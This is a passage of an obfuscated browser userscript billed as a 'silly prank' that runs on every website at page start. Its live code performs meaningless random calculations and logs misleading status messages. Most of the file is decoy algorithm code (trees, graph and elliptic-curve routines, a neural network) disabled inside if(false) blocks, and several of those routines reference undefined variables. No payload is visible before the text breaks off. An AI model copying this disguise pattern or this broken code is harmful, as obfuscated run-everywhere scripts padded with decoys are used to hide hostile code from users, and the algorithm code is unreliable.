// ==UserScript==
// @name         Silly prank for the bestiesss
// @namespace    https://www.urbandictionary.com/define.php?term=Sophia
// @version      1.0
// @description  Not sure, you'll see! <3
// @author       Sophia404
// @run-at       document-start
// @include      http://*
// @include      https://*
// @grant        none
// ==/UserScript==

function performCalculations() {
  const _0x2dd043 = Math.random()
  let _0x358740 = 0
  for (let _0xacde24 = 0; _0xacde24 < 100; _0xacde24++) {
    _0x358740 += Math.pow(Math.sin(_0xacde24) * _0x2dd043, 2)
  }
  return _0x358740 * Math.random()
}
function encodeBase64(_0x548fba) {
  return btoa(_0x548fba)
}
function decodeBase64(_0x26349d) {
  return atob(_0x26349d)
}
function calculateChecksum(_0x27b196) {
  let _0x38e484 = 0
  for (let _0x4973f6 = 0; _0x4973f6 < _0x27b196.length; _0x4973f6++) {
    _0x38e484 += _0x27b196.charCodeAt(_0x4973f6)
  }
  return _0x38e484
}
function performAdvancedCalculations() {
  const _0x599ae1 = []
  for (let _0x236b2c = 0; _0x236b2c < 300; _0x236b2c++) {
    let _0x36b07e = performCalculations()
    _0x599ae1.push(_0x36b07e)
  }
  return _0x599ae1.reduce((_0x371902, _0x4e981c) => _0x371902 + _0x4e981c, 0)
}
function processDataForFurtherAnalysis() {
  const _0xd647b2 = performAdvancedCalculations()
  _0xd647b2 > 1000
    ? console.log('Data processed successfully:', _0xd647b2)
    : (console.warn('Data analysis incomplete, retrying...'),
      processDataForFurtherAnalysis())
}
processDataForFurtherAnalysis()
function handleAsyncOperations() {
  const _0x3590c1 = Math.random()
  setTimeout(() => {
    console.log('Async operation completed with value:', _0x3590c1)
  }, Math.floor(Math.random() * 3000))
}
handleAsyncOperations()
if (false) {
  class RedBlackTreeNode {
    constructor(_0x1fac06) {
      this.value = _0x1fac06
      this.color = 'RED'
      this.left = null
      this.right = null
      this.parent = null
    }
  }
  class RedBlackTree {
    constructor() {
      this.root = null
    }
    ['rotateLeft'](_0x11499d) {
      const _0x46a24b = _0x11499d.right
      _0x11499d.right = _0x46a24b.left
      _0x46a24b.left !== null && (_0x46a24b.left.parent = _0x11499d)
      _0x46a24b.parent = _0x11499d.parent
      _0x11499d.parent === null
        ? (this.root = _0x46a24b)
        : _0x11499d === _0x11499d.parent.left
        ? (_0x11499d.parent.left = _0x46a24b)
        : (_0x11499d.parent.right = _0x46a24b)
      _0x46a24b.left = _0x11499d
      _0x11499d.parent = _0x46a24b
    }
    ['rotateRight'](_0x3a7b2a) {
      const _0x1862c4 = _0x3a7b2a.left
      _0x3a7b2a.left = _0x1862c4.right
      _0x1862c4.right !== null && (_0x1862c4.right.parent = _0x3a7b2a)
      _0x1862c4.parent = _0x3a7b2a.parent
      _0x3a7b2a.parent === null
        ? (this.root = _0x1862c4)
        : _0x3a7b2a === _0x3a7b2a.parent.right
        ? (_0x3a7b2a.parent.right = _0x1862c4)
        : (_0x3a7b2a.parent.left = _0x1862c4)
      _0x1862c4.right = _0x3a7b2a
      _0x3a7b2a.parent = _0x1862c4
    }
    ['insert'](_0x4f9bae) {
      let _0x49e0ee = new RedBlackTreeNode(_0x4f9bae),
        _0x5c9054 = null,
        _0x2acdb9 = this.root
      while (_0x2acdb9 !== null) {
        _0x5c9054 = _0x2acdb9
        _0x49e0ee.value < _0x2acdb9.value
          ? (_0x2acdb9 = _0x2acdb9.left)
          : (_0x2acdb9 = _0x2acdb9.right)
      }
      _0x49e0ee.parent = _0x5c9054
      _0x5c9054 === null
        ? (this.root = _0x49e0ee)
        : _0x49e0ee.value < _0x5c9054.value
        ? (_0x5c9054.left = _0x49e0ee)
        : (_0x5c9054.right = _0x49e0ee)
      _0x49e0ee.left = null
      _0x49e0ee.right = null
      _0x49e0ee.color = 'RED'
      this.fixInsert(_0x49e0ee)
    }
    ['fixInsert'](_0x338f84) {
      while (_0x338f84 !== this.root && _0x338f84.parent.color === 'RED') {
        if (_0x338f84.parent === _0x338f84.parent.parent.left) {
          let _0x2f5399 = _0x338f84.parent.parent.right
          _0x2f5399 && _0x2f5399.color === 'RED'
            ? ((_0x338f84.parent.color = 'BLACK'),
              (_0x2f5399.color = 'BLACK'),
              (_0x338f84.parent.parent.color = 'RED'),
              (_0x338f84 = _0x338f84.parent.parent))
            : (_0x338f84 === _0x338f84.parent.right &&
                ((_0x338f84 = _0x338f84.parent), this.rotateLeft(_0x338f84)),
              (_0x338f84.parent.color = 'BLACK'),
              (_0x338f84.parent.parent.color = 'RED'),
              this.rotateRight(_0x338f84.parent.parent))
        } else {
          let _0x30ad4d = _0x338f84.parent.parent.left
          _0x30ad4d && _0x30ad4d.color === 'RED'
            ? ((_0x338f84.parent.color = 'BLACK'),
              (_0x30ad4d.color = 'BLACK'),
              (_0x338f84.parent.parent.color = 'RED'),
              (_0x338f84 = _0x338f84.parent.parent))
            : (_0x338f84 === _0x338f84.parent.left &&
                ((_0x338f84 = _0x338f84.parent), this.rotateRight(_0x338f84)),
              (_0x338f84.parent.color = 'BLACK'),
              (_0x338f84.parent.parent.color = 'RED'),
              this.rotateLeft(_0x338f84.parent.parent))
        }
      }
      this.root.color = 'BLACK'
    }
  }
  class SegmentTree {
    constructor(_0x243f20) {
      this.n = _0x243f20.length
      this.tree = new Array(this.n * 4).fill(0)
      this.build(_0x243f20, 0, this.n - 1, 1)
    }
    ['build'](_0x322343, _0x4b6d7b, _0x47e94f, _0x1df6d0) {
      if (_0x4b6d7b === _0x47e94f) {
        this.tree[_0x1df6d0] = _0x322343[_0x4b6d7b]
        return
      }
      let _0x4840c0 = Math.floor((_0x4b6d7b + _0x47e94f) / 2)
      this.build(_0x322343, _0x4b6d7b, _0x4840c0, _0x1df6d0 * 2)
      this.build(_0x322343, _0x4840c0 + 1, _0x47e94f, _0x1df6d0 * 2 + 1)
      this.tree[_0x1df6d0] =
        this.tree[_0x1df6d0 * 2] + this.tree[_0x1df6d0 * 2 + 1]
    }
    ['query'](
      _0x57c30b,
      _0x2069e0,
      _0x16d855 = 0,
      _0x3e690f = this.n - 1,
      _0x8c77fd = 1
    ) {
      if (_0x57c30b > _0x3e690f || _0x2069e0 < _0x16d855) {
        return 0
      }
      if (_0x57c30b <= _0x16d855 && _0x3e690f <= _0x2069e0) {
        return this.tree[_0x8c77fd]
      }
      let _0x31eb09 = Math.floor((_0x16d855 + _0x3e690f) / 2)
      return (
        this.query(_0x57c30b, _0x2069e0, _0x16d855, _0x31eb09, _0x8c77fd * 2) +
        this.query(
          _0x57c30b,
          _0x2069e0,
          _0x31eb09 + 1,
          _0x3e690f,
          _0x8c77fd * 2 + 1
        )
      )
    }
    ['update'](
      _0x452e61,
      _0x1d6a22,
      _0x204807 = 0,
      _0x13ebf8 = this.n - 1,
      _0x36cd0c = 1
    ) {
      if (_0x204807 === _0x13ebf8) {
        this.tree[_0x36cd0c] = _0x1d6a22
        return
      }
      let _0x3542dc = Math.floor((_0x204807 + _0x13ebf8) / 2)
      _0x452e61 <= _0x3542dc
        ? this.update(_0x452e61, _0x1d6a22, _0x204807, _0x3542dc, _0x36cd0c * 2)
        : this.update(
            _0x452e61,
            _0x1d6a22,
            _0x3542dc + 1,
            _0x13ebf8,
            _0x36cd0c * 2 + 1
          )
      this.tree[_0x36cd0c] =
        this.tree[_0x36cd0c * 2] + this.tree[_0x36cd0c * 2 + 1]
    }
  }
  class BSTNode {
    constructor(_0x1f829f) {
      this.value = _0x1f829f
      this.left = null
      this.right = null
    }
  }
  class BinarySearchTree {
    constructor() {
      this.root = null
    }
    ['insert'](_0x24d784) {
      const _0x547e72 = new BSTNode(_0x24d784)
      if (this.root === null) {
        this.root = _0x547e72
        return
      }
      let _0x343eff = this.root
      while (true) {
        if (_0x24d784 < _0x343eff.value) {
          if (_0x343eff.left === null) {
            _0x343eff.left = _0x547e72
            break
          }
          _0x343eff = _0x343eff.left
        } else {
          if (_0x343eff.right === null) {
            _0x343eff.right = _0x547e72
            break
          }
          _0x343eff = _0x343eff.right
        }
      }
    }
    ['search'](_0x1a325d) {
      let _0x3e1313 = this.root
      while (_0x3e1313 !== null) {
        if (_0x1a325d === _0x3e1313.value) {
          return true
        }
        _0x3e1313 =
          _0x1a325d < _0x3e1313.value ? _0x3e1313.left : _0x3e1313.right
      }
      return false
    }
  }
  class AVLNode {
    constructor(_0x25a464) {
      this.value = _0x25a464
      this.left = null
      this.right = null
      this.height = 1
    }
  }
  class AVLTree {
    constructor() {
      this.root = null
    }
    ['getHeight'](_0x2c3598) {
      return _0x2c3598 ? _0x2c3598.height : 0
    }
    ['getBalance'](_0x3eee49) {
      return _0x3eee49
        ? this.getHeight(_0x3eee49.left) - this.getHeight(_0x3eee49.right)
        : 0
    }
    ['rightRotate'](_0xc8ed4a) {
      let _0x46a5ae = _0xc8ed4a.left,
        _0x28b75a = _0x46a5ae.right
      return (
        (_0x46a5ae.right = _0xc8ed4a),
        (_0xc8ed4a.left = _0x28b75a),
        (_0xc8ed4a.height =
          Math.max(
            this.getHeight(_0xc8ed4a.left),
            this.getHeight(_0xc8ed4a.right)
          ) + 1),
        (_0x46a5ae.height =
          Math.max(
            this.getHeight(_0x46a5ae.left),
            this.getHeight(_0x46a5ae.right)
          ) + 1),
        _0x46a5ae
      )
    }
    ['leftRotate'](_0x45d445) {
      let _0x1d7d22 = _0x45d445.right,
        _0x34096d = _0x1d7d22.left
      return (
        (_0x1d7d22.left = _0x45d445),
        (_0x45d445.right = _0x34096d),
        (_0x45d445.height =
          Math.max(
            this.getHeight(_0x45d445.left),
            this.getHeight(_0x45d445.right)
          ) + 1),
        (_0x1d7d22.height =
          Math.max(
            this.getHeight(_0x1d7d22.left),
            this.getHeight(_0x1d7d22.right)
          ) + 1),
        _0x1d7d22
      )
    }
    ['insertNode'](_0x3463af, _0x3fa5b5) {
      if (_0x3463af === null) {
        return new AVLNode(_0x3fa5b5)
      }
      _0x3fa5b5 < _0x3463af.value
        ? (_0x3463af.left = this.insertNode(_0x3463af.left, _0x3fa5b5))
        : (_0x3463af.right = this.insertNode(_0x3463af.right, _0x3fa5b5))
      _0x3463af.height =
        1 +
        Math.max(
          this.getHeight(_0x3463af.left),
          this.getHeight(_0x3463af.right)
        )
      let _0x42eb8c = this.getBalance(_0x3463af)
      if (_0x42eb8c > 1 && _0x3fa5b5 < _0x3463af.left.value) {
        return this.rightRotate(_0x3463af)
      }
      if (_0x42eb8c < -1 && _0x3fa5b5 > _0x3463af.right.value) {
        return this.leftRotate(_0x3463af)
      }
      if (_0x42eb8c > 1 && _0x3fa5b5 > _0x3463af.left.value) {
        return (
          (_0x3463af.left = this.leftRotate(_0x3463af.left)),
          this.rightRotate(_0x3463af)
        )
      }
      if (_0x42eb8c < -1 && _0x3fa5b5 < _0x3463af.right.value) {
        return (
          (_0x3463af.right = this.rightRotate(_0x3463af.right)),
          this.leftRotate(_0x3463af)
        )
      }
      return _0x3463af
    }
    ['insert'](_0x14c588) {
      this.root = this.insertNode(this.root, _0x14c588)
    }
  }
  class SplayNode {
    constructor(_0x43f4bd) {
      this.value = _0x43f4bd
      this.left = null
      this.right = null
    }
  }
  class SplayTree {
    constructor() {
      this.root = null
    }
    ['rightRotate'](_0x1b3e7b) {
      let _0x4f9fb7 = _0x1b3e7b.left
      return (
        (_0x1b3e7b.left = _0x4f9fb7.right),
        (_0x4f9fb7.right = _0x1b3e7b),
        _0x4f9fb7
      )
    }
    ['leftRotate'](_0x466a2f) {
      let _0x45c61f = _0x466a2f.right
      return (
        (_0x466a2f.right = _0x45c61f.left),
        (_0x45c61f.left = _0x466a2f),
        _0x45c61f
      )
    }
    ['splay'](_0x4cc8fb, _0x5f3d58) {
      if (_0x4cc8fb === null || _0x4cc8fb.value === _0x5f3d58) {
        return _0x4cc8fb
      }
      if (_0x5f3d58 < _0x4cc8fb.value) {
        if (_0x4cc8fb.left === null) {
          return _0x4cc8fb
        }
        return (
          _0x5f3d58 < _0x4cc8fb.left.value
            ? ((_0x4cc8fb.left.left = this.splay(
                _0x4cc8fb.left.left,
                _0x5f3d58
              )),
              (_0x4cc8fb = this.rightRotate(_0x4cc8fb)))
            : _0x5f3d58 > _0x4cc8fb.left.value &&
              ((_0x4cc8fb.left.right = this.splay(
                _0x4cc8fb.left.right,
                _0x5f3d58
              )),
              _0x4cc8fb.left.right !== null &&
                (_0x4cc8fb.left = this.leftRotate(_0x4cc8fb.left))),
          _0x4cc8fb.left === null ? _0x4cc8fb : this.rightRotate(_0x4cc8fb)
        )
      } else {
        if (_0x4cc8fb.right === null) {
          return _0x4cc8fb
        }
        return (
          _0x5f3d58 < _0x4cc8fb.right.value
            ? ((_0x4cc8fb.right.left = this.splay(
                _0x4cc8fb.right.left,
                _0x5f3d58
              )),
              _0x4cc8fb.right.left !== null &&
                (_0x4cc8fb.right = this.rightRotate(_0x4cc8fb.right)))
            : _0x5f3d58 > _0x4cc8fb.right.value &&
              ((_0x4cc8fb.right.right = this.splay(
                _0x4cc8fb.right.right,
                _0x5f3d58
              )),
              (_0x4cc8fb = this.leftRotate(_0x4cc8fb))),
          _0x4cc8fb.right === null ? _0x4cc8fb : this.leftRotate(_0x4cc8fb)
        )
      }
    }
    ['insert'](_0x140cb1) {
      if (this.root === null) {
        this.root = new SplayNode(_0x140cb1)
        return
      }
      this.root = this.splay(this.root, _0x140cb1)
      if (this.root.value === _0x140cb1) {
        return
      }
      let _0x19b12f = new SplayNode(_0x140cb1)
      _0x140cb1 < this.root.value
        ? ((_0x19b12f.right = this.root),
          (_0x19b12f.left = this.root.left),
          (this.root.left = null))
        : ((_0x19b12f.left = this.root),
          (_0x19b12f.right = this.root.right),
          (this.root.right = null))
      this.root = _0x19b12f
    }
  }
  class BTreeNode {
    constructor(_0x4915ec, _0x337f38) {
      this.t = _0x4915ec
      this.leaf = _0x337f38
      this.keys = []
      this.children = []
    }
    ['insertNonFull'](_0x3a57d6) {
      let _0x4f9ba4 = this.keys.length - 1
      if (this.leaf) {
        this.keys.push(0)
        while (_0x4f9ba4 >= 0 && _0x3a57d6 < this.keys[_0x4f9ba4]) {
          this.keys[_0x4f9ba4 + 1] = this.keys[_0x4f9ba4]
          _0x4f9ba4--
        }
        this.keys[_0x4f9ba4 + 1] = _0x3a57d6
      } else {
        while (_0x4f9ba4 >= 0 && _0x3a57d6 < this.keys[_0x4f9ba4]) {
          _0x4f9ba4--
        }
        _0x4f9ba4++
        this.children[_0x4f9ba4].keys.length === 2 * this.t - 1 &&
          (this.splitChild(_0x4f9ba4, this.children[_0x4f9ba4]),
          _0x3a57d6 > this.keys[_0x4f9ba4] && _0x4f9ba4++)
        this.children[_0x4f9ba4].insertNonFull(_0x3a57d6)
      }
    }
    ['splitChild'](_0x4e5f15, _0x2010df) {
      let _0x50255e = this.t,
        _0x1dc27f = new BTreeNode(_0x50255e, _0x2010df.leaf)
      _0x1dc27f.keys = _0x2010df.keys.splice(_0x50255e)
      !_0x2010df.leaf &&
        (_0x1dc27f.children = _0x2010df.children.splice(_0x50255e))
      this.keys.splice(_0x4e5f15, 0, _0x2010df.keys.pop())
      this.children.splice(_0x4e5f15 + 1, 0, _0x1dc27f)
    }
  }
  class BTree {
    constructor(_0x28a4c7) {
      this.t = _0x28a4c7
      this.root = new BTreeNode(_0x28a4c7, true)
    }
    ['insert'](_0x9c81d0) {
      let _0x125671 = this.root
      if (_0x125671.keys.length === 2 * this.t - 1) {
        let _0x300a8a = new BTreeNode(this.t, false)
        _0x300a8a.children.push(_0x125671)
        _0x300a8a.splitChild(0, _0x125671)
        let _0x431939 = 0
        _0x300a8a.keys[0] < _0x9c81d0 && _0x431939++
        _0x300a8a.children[_0x431939].insertNonFull(_0x9c81d0)
        this.root = _0x300a8a
      } else {
        _0x125671.insertNonFull(_0x9c81d0)
      }
    }
  }
  class TrieNode {
    constructor() {
      this.children = {}
      this.endOfWord = false
    }
  }
  class Trie {
    constructor() {
      this.root = new TrieNode()
    }
    ['insert'](_0x4b9af3) {
      let _0x5f01bd = this.root
      for (let _0x2263c1 of _0x4b9af3) {
        !_0x5f01bd.children[_0x2263c1] &&
          (_0x5f01bd.children[_0x2263c1] = new TrieNode())
        _0x5f01bd = _0x5f01bd.children[_0x2263c1]
      }
      _0x5f01bd.endOfWord = true
    }
    ['search'](_0x14fe32) {
      let _0x4fd4a0 = this.root
      for (let _0x196f3b of _0x14fe32) {
        if (!_0x4fd4a0.children[_0x196f3b]) {
          return false
        }
        _0x4fd4a0 = _0x4fd4a0.children[_0x196f3b]
      }
      return _0x4fd4a0.endOfWord
    }
    ['startsWith'](_0x2308b4) {
      let _0x4f7c5e = this.root
      for (let _0x229e0b of _0x2308b4) {
        if (!_0x4f7c5e.children[_0x229e0b]) {
          return false
        }
        _0x4f7c5e = _0x4f7c5e.children[_0x229e0b]
      }
      return true
    }
  }
}
if (false) {
  function grahamScan(_0x3e660c) {
    if (_0x3e660c.length < 3) {
      return _0x3e660c
    }
    let _0x7b15ee = _0x3e660c.reduce((_0xcd4e36, _0x192bc4) => {
      if (
        _0x192bc4.y < _0xcd4e36.y ||
        (_0x192bc4.y === _0xcd4e36.y && _0x192bc4.x < _0xcd4e36.x)
      ) {
        return _0x192bc4
      }
      return _0xcd4e36
    }, _0x3e660c[0])
    const _0x398bf7 = _0x3e660c.slice().sort((_0x1b95ae, _0x45f02f) => {
        const _0x1aa69d = Math.atan2(
            _0x1b95ae.y - _0x7b15ee.y,
            _0x1b95ae.x - _0x7b15ee.x
          ),
          _0x200fbc = Math.atan2(
            _0x45f02f.y - _0x7b15ee.y,
            _0x45f02f.x - _0x7b15ee.x
          )
        return _0x1aa69d - _0x200fbc
      }),
      _0x413170 = []
    for (let _0x2ecbce of _0x398bf7) {
      while (_0x413170.length >= 2) {
        const _0x3dd46a = _0x413170[_0x413170.length - 1],
          _0x17ed1a = _0x413170[_0x413170.length - 2]
        if (
          (_0x3dd46a.x - _0x17ed1a.x) * (_0x2ecbce.y - _0x17ed1a.y) -
            (_0x3dd46a.y - _0x17ed1a.y) * (_0x2ecbce.x - _0x17ed1a.x) >
          0
        ) {
          break
        }
        _0x413170.pop()
      }
      _0x413170.push(_0x2ecbce)
    }
    return _0x413170
  }
  function quickHull(_0x25c590) {
    if (_0x25c590.length < 3) {
      return _0x25c590
    }
    const _0xf8e000 = (_0x527a91, _0x256890, _0x324bca) =>
        (_0x324bca.x - _0x256890.x) * (_0x527a91.y - _0x256890.y) -
        (_0x324bca.y - _0x256890.y) * (_0x527a91.x - _0x256890.x),
      _0x53e26e = (_0x2d704e, _0x307af2, _0x3eb311) =>
        Math.abs(_0xf8e000(_0x2d704e, _0x307af2, _0x3eb311)),
      _0x4ed60b = (_0x4f9841, _0x2ab55d, _0x228ccc, _0x4f333c) => {
        let _0x488d9b = -1,
          _0x317b15 = 0
        for (let _0x574d31 = 0; _0x574d31 < _0x4f9841.length; _0x574d31++) {
          let _0x594bb6 = _0x53e26e(_0x4f9841[_0x574d31], _0x2ab55d, _0x228ccc)
          _0x594bb6 > _0x317b15 &&
            ((_0x488d9b = _0x574d31), (_0x317b15 = _0x594bb6))
        }
        if (_0x488d9b === -1) {
          return
        }
        const _0x30aa4c = _0x4f9841[_0x488d9b]
        _0x4f333c.push(_0x30aa4c)
        const _0x1ebdad = _0x4f9841.filter(
            (_0x2457dc) => _0xf8e000(_0x2457dc, _0x2ab55d, _0x30aa4c) > 0
          ),
          _0x9bbb8e = _0x4f9841.filter(
            (_0x389eff) => _0xf8e000(_0x389eff, _0x30aa4c, _0x228ccc) > 0
          )
        _0x4ed60b(_0x1ebdad, _0x2ab55d, _0x30aa4c, _0x4f333c)
        _0x4ed60b(_0x9bbb8e, _0x30aa4c, _0x228ccc, _0x4f333c)
      }
    let _0x6d417 = _0x25c590.reduce(
        (_0x550a3c, _0x28142a) =>
          _0x28142a.x < _0x550a3c.x ? _0x28142a : _0x550a3c,
        _0x25c590[0]
      ),
      _0x18e73c = _0x25c590.reduce(
        (_0x3cf8ef, _0x2541a1) =>
          _0x2541a1.x > _0x3cf8ef.x ? _0x2541a1 : _0x3cf8ef,
        _0x25c590[0]
      )
    const _0x9022b2 = _0x25c590.filter(
        (_0x2ce3aa) => _0xf8e000(_0x2ce3aa, _0x6d417, _0x18e73c) > 0
      ),
      _0x106120 = _0x25c590.filter(
        (_0x73380a) => _0xf8e000(_0x73380a, _0x6d417, _0x18e73c) < 0
      ),
      _0x18ee0e = [_0x6d417, _0x18e73c]
    return (
      _0x4ed60b(_0x9022b2, _0x6d417, _0x18e73c, _0x18ee0e),
      _0x4ed60b(_0x106120, _0x18e73c, _0x6d417, _0x18ee0e),
      Array.from(new Set(_0x18ee0e))
    )
  }
  function dijkstra(_0x49e53f, _0x108deb) {
    const _0x5bf901 = {
        _0x106371: Infinity,
        _0x202559: 0,
      },
      _0x2bd51e = Object.keys(_0x49e53f)
    for (let _0x5da654 of _0x2bd51e) {
    }
    while (_0x2bd51e.length) {
      let _0x2f1d00 = _0x2bd51e.reduce((_0x5e2f49, _0x370bd7) => {
        if (_0x4625c6[_0x370bd7]) {
          return _0x5e2f49
        }
        if (_0x5e2f49 === null || _0x5bf901[_0x370bd7] < _0x5bf901[_0x5e2f49]) {
          return _0x370bd7
        }
        return _0x5e2f49
      }, null)
      if (_0x2f1d00 === null) {
        break
      }
      for (let _0x1cd86f of _0x49e53f[_0x2f1d00]) {
        let _0x351e35 = _0x5bf901[_0x2f1d00] + _0x1cd86f.weight
        _0x351e35 < _0x5bf901[_0x1cd86f.node] &&
          (_0x5bf901[_0x1cd86f.node] = _0x351e35)
      }
      const _0x5510d6 = _0x2bd51e.indexOf(_0x2f1d00)
      _0x5510d6 > -1 && _0x2bd51e.splice(_0x5510d6, 1)
    }
    return _0x5bf901
  }
  function primMST(_0x1208d2) {
    const _0x348fe7 = Object.keys(_0x1208d2)
    if (_0x348fe7.length === 0) {
      return []
    }
    const _0x1d1aeb = [],
      _0x34e8a4 = [],
      _0x2e83d6 = _0x348fe7[0]
    for (let _0x24f15c of _0x1208d2[_0x2e83d6]) {
      _0x34e8a4.push({
        from: _0x2e83d6,
        to: _0x24f15c.node,
        weight: _0x24f15c.weight,
      })
    }
    while (_0x34e8a4.length) {
      _0x34e8a4.sort(
        (_0x2598df, _0x29776f) => _0x2598df.weight - _0x29776f.weight
      )
      const _0x10308f = _0x34e8a4.shift()
      if (_0x5caaae[_0x10308f.to]) {
        continue
      }
      _0x5caaae[_0x10308f.to] = true
      _0x1d1aeb.push(_0x10308f)
      for (let _0x17a6c5 of _0x1208d2[_0x10308f.to]) {
        !_0x5caaae[_0x17a6c5.node] &&
          _0x34e8a4.push({
            from: _0x10308f.to,
            to: _0x17a6c5.node,
            weight: _0x17a6c5.weight,
          })
      }
    }
    return _0x1d1aeb
  }
  function kruskalMST(_0x57dbe8, _0x5cab9b) {
    const _0x1f6f31 = { _0x368699: _0x368699 }
    for (let _0x3c0d01 = 0; _0x3c0d01 < _0x5cab9b; _0x3c0d01++) {}
    function _0x2eb03e(_0xbd8e85) {
      return (
        _0x1f6f31[_0xbd8e85] !== _0xbd8e85 &&
          (_0x1f6f31[_0xbd8e85] = _0x2eb03e(_0x1f6f31[_0xbd8e85])),
        _0x1f6f31[_0xbd8e85]
      )
    }
    function _0x577227(_0x37c9cf, _0x37034b) {
      _0x1f6f31[_0x2eb03e(_0x37c9cf)] = _0x2eb03e(_0x37034b)
    }
    _0x57dbe8.sort(
      (_0x514d90, _0x3e714d) => _0x514d90.weight - _0x3e714d.weight
    )
    const _0x549d97 = []
    for (let _0x5cbfd8 of _0x57dbe8) {
      _0x2eb03e(_0x5cbfd8.from) !== _0x2eb03e(_0x5cbfd8.to) &&
        (_0x549d97.push(_0x5cbfd8), _0x577227(_0x5cbfd8.from, _0x5cbfd8.to))
    }
    return _0x549d97
  }
  class EllipticCurve {
    constructor(_0x4d3e3a, _0x41f255, _0x32c275) {
      this.a = _0x4d3e3a
      this.b = _0x41f255
      this.p = _0x32c275
    }
    ['mod'](_0x11318f) {
      return ((_0x11318f % this.p) + this.p) % this.p
    }
    ['isOnCurve'](_0xf90048) {
      if (_0xf90048 === null) {
        return true
      }
      const { x: _0xf2eec5, y: _0x5cdc88 } = _0xf90048
      return (
        this.mod(_0x5cdc88 * _0x5cdc88) ===
        this.mod(
          _0xf2eec5 * _0xf2eec5 * _0xf2eec5 + this.a * _0xf2eec5 + this.b
        )
      )
    }
    ['modInverse'](_0x1b3cde) {
      let _0x68d8f9 = this.mod(_0x1b3cde),
        _0x2e26c1 = this.p,
        _0x54e3c0 = _0x2e26c1,
        _0x44298d = 0,
        _0x18c470 = 1
      if (_0x2e26c1 === 1) {
        return 0
      }
      while (_0x68d8f9 > 1) {
        let _0x34c0aa = Math.floor(_0x68d8f9 / _0x2e26c1),
          _0x239044 = _0x2e26c1
        _0x2e26c1 = _0x68d8f9 % _0x2e26c1
        _0x68d8f9 = _0x239044
        _0x239044 = _0x44298d
        _0x44298d = _0x18c470 - _0x34c0aa * _0x44298d
        _0x18c470 = _0x239044
      }
      return _0x18c470 < 0 && (_0x18c470 += _0x54e3c0), _0x18c470
    }
    ['pointAdd'](_0x1d9734, _0x466798) {
      if (_0x1d9734 === null) {
        return _0x466798
      }
      if (_0x466798 === null) {
        return _0x1d9734
      }
      if (_0x1d9734.x === _0x466798.x && _0x1d9734.y !== _0x466798.y) {
        return null
      }
      let _0x4f67f9
      _0x1d9734.x === _0x466798.x && _0x1d9734.y === _0x466798.y
        ? (_0x4f67f9 = this.mod(
            (3 * _0x1d9734.x * _0x1d9734.x + this.a) *
              this.modInverse(2 * _0x1d9734.y)
          ))
        : (_0x4f67f9 = this.mod(
            (_0x466798.y - _0x1d9734.y) *
              this.modInverse(_0x466798.x - _0x1d9734.x)
          ))
      const _0x128826 = this.mod(
          _0x4f67f9 * _0x4f67f9 - _0x1d9734.x - _0x466798.x
        ),
        _0x2eb33c = this.mod(
          _0x4f67f9 * (_0x1d9734.x - _0x128826) - _0x1d9734.y
        )
      return {
        x: _0x128826,
        y: _0x2eb33c,
      }
    }
    ['scalarMultiply'](_0x4c6e4e, _0x4e2148) {
      let _0x3d8c97 = _0x4c6e4e,
        _0xafed24 = null
      while (_0x4e2148 > 0) {
        _0x4e2148 & 1 && (_0xafed24 = this.pointAdd(_0xafed24, _0x3d8c97))
        _0x3d8c97 = this.pointAdd(_0x3d8c97, _0x3d8c97)
        _0x4e2148 = Math.floor(_0x4e2148 / 2)
      }
      return _0xafed24
    }
  }
  class MarkovChain {
    constructor(_0x46991f) {
      this.transitionMatrix = _0x46991f
      this.numStates = _0x46991f.length
    }
    ['nextState'](_0x54ce21) {
      const _0x490de3 = new Array(this.numStates).fill(0)
      for (let _0x31247f = 0; _0x31247f < this.numStates; _0x31247f++) {
        for (let _0x4b7d9a = 0; _0x4b7d9a < this.numStates; _0x4b7d9a++) {
          _0x490de3[_0x4b7d9a] +=
            _0x54ce21[_0x31247f] * this.transitionMatrix[_0x31247f][_0x4b7d9a]
        }
      }
      return _0x490de3
    }
    ['simulate'](_0x1b5c78, _0xbe09d5) {
      let _0x2a4ded = _0x1b5c78
      for (let _0x453cec = 0; _0x453cec < _0xbe09d5; _0x453cec++) {
        _0x2a4ded = this.nextState(_0x2a4ded)
      }
      return _0x2a4ded
    }
  }
  function grobnerBasis(_0x2c304c, _0x4226a5) {
    let _0x4cffee = _0x2c304c.slice(),
      _0x8a490d = []
    for (let _0x1642c0 = 0; _0x1642c0 < _0x4cffee.length; _0x1642c0++) {
      for (
        let _0x3c5701 = _0x1642c0 + 1;
        _0x3c5701 < _0x4cffee.length;
        _0x3c5701++
      ) {
        _0x8a490d.push([_0x4cffee[_0x1642c0], _0x4cffee[_0x3c5701]])
      }
    }
    while (_0x8a490d.length > 0) {
      let [_0x102c3e, _0x3e01ab] = _0x8a490d.shift(),
        _0x3b6dfb = {},
        _0x1a96df = _0x3b6dfb
    }
    return _0x4cffee
  }
  ;('use strict')
  class NeuralNetwork {
    constructor(_0x476e9e, _0x35e4b7, _0x19390d, _0x587afe = 0.01) {
      if (
        _0x476e9e <= 0 ||
        _0x19390d <= 0 ||
        _0x35e4b7.some((_0x289ab8) => _0x289ab8 <= 0)
      ) {
        throw new Error('All layer sizes must be positive integers.')
      }
      this.inputSize = _0x476e9e
      this.hiddenSizes = _0x35e4b7
      this.outputSize = _0x19390d
      this.learningRate = _0x587afe
      this.weights = []
      this.biases = []
      let _0x42f317 = _0x476e9e
      for (let _0x5c98fa = 0; _0x5c98fa < _0x35e4b7.length; _0x5c98fa++) {
        this.weights.push(this.randomMatrix(_0x35e4b7[_0x5c98fa], _0x42f317))
        this.biases.push(this.randomMatrix(_0x35e4b7[_0x5c98fa], 1))
        _0x42f317 = _0x35e4b7[_0x5c98fa]
      }
      this.weights.push(this.randomMatrix(_0x19390d, _0x42f317))
      this.biases.push(this.randomMatrix(_0x19390d, 1))
    }
    ['randomMatrix'](_0x2a93dd, _0x4ca06f) {
      let _0x27ce79 = []
      for (let _0x184aac = 0; _0x184aac < _0x2a93dd; _0x184aac++) {
        let _0x162b87 = []
        for (let _0x1da960 = 0; _0x1da960 < _0x4ca06f; _0x1da960++) {
          _0x162b87.push(Math.random() * 2 - 1)
        }
        _0x27ce79.push(_0x162b87)
      }
      return _0x27ce79
    }
    static ['sigmoid'](_0x276e78) {
      return 1 / (1 + Math.exp(-_0x276e78))
    }
    static ['dsigmoid'](_0x24b8e9) {
      return _0x24b8e9 * (1 - _0x24b8e9)
    }
    static ['relu'](_0x4ed1c8) {
      return _0x4ed1c8 > 0 ? _0x4ed1c8 : 0
    }
    static ['drelu'](_0x482318) {
      return _0x482318 > 0 ? 1 : 0
    }
    static ['matMul'](_0x386a39, _0x26d217) {
      let _0x110d0f = [],
        _0x2a359e = _0x386a39.length,
